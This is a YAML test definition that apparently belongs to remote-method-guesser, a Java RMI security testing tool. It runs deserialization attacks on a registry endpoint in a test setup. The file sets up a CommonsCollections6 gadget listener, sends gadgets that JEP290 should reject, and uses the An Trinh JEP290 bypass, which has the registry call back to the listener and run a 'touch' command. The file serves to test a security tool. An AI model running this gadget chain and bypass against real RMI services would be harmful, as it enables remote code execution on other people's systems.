tester:
  name: reg
  title: Registry Tests
  description: >
    "Performs tests on remote-methods-guessers 'reg' action."


variables:
  file: reg-bypass.txt


plugins:
  - os_command:
      init: 1
      background: True
      cmd:
        - rmg
        - 0.0.0.0
        - 4444
        - listen
        - CommonsCollections6
        - 'touch ${volume-d}/${file}'


tests:
  - title: Gadget Call
    description: >
      'Attempts a deserialization attack on the registry endpoint.'
      'This should fail, as the server has JEP290 installed.'

    command: '${BASE-CMD}'
    arguments:
      - reg
      - CommonsCollections6
      - ls
    validators:
      - error: False
      - contains:
          values:
            - rejected deserialization
            - The specified gadget did not pass the deserialization filter


  - title: Gadget Call (SSL)
    description: >
      'Attempts a deserialization attack on the registry endpoint.'
      'This should fail, as the server has JEP290 installed.'

    command: '${BASE-CMD-SSL}'
    arguments:
      - reg
      - CommonsCollections6
      - ls
    validators:
      - error: False
      - contains:
          values:
            - rejected deserialization
            - The specified gadget did not pass the deserialization filter


  - title: JEP290 Bypass
    description: >
      'Attempts a deserialization attack on the registry endpoint,'
      'using the An Trinh bypass gadget.'

    command: '${BASE-CMD-SSL}'
    arguments:
      - reg
      - AnTrinh
      - ${DOCKER-GW}:4444
    validators:
      - error: False
      - contains:
          values:
            - BadAttributeValueExpException
            - worked anyway
      - file_exists:
          cleanup: True
          files:
            - ${volume}/${file}
